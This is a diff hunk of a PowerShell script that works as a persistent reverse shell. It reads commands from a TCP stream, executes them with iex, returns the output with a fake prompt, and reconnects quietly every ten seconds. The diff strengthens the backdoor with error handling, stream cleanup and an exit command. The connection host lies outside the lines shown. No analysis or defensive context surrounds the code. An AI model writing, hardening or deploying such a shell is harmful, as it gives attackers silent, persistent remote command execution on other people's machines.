@@ -4,17 +4,29 @@ while ($true) {
         $stream = $client.GetStream()
         [byte[]]$bytes = 0..65535 | % {0}
 
-        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
-            $sendback = (iex $data 2>&1 | Out-String)
-            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte, 0, $sendbyte.Length)
-            $stream.Flush()
+        while ($stream.CanRead) {
+            try {
+                $i = $stream.Read($bytes, 0, $bytes.Length)
+                if ($i -le 0) { break }  # Stream closed
+
+                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+                if ($data -eq "exit") { break }  # Exit command from server
+
+                $sendback = (iex $data 2>&1 | Out-String)
+                $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+                $stream.Write($sendbyte, 0, $sendbyte.Length)
+                $stream.Flush()
+            } catch {
+                break  # Any error: break the inner loop and retry
+            }
         }
 
+        $stream.Close()
         $client.Close()
     } catch {
-        Start-Sleep -Seconds 10  # Wait before retrying
+        # Connection failed — retry quietly
     }
+
+    Start-Sleep -Seconds 10
 }
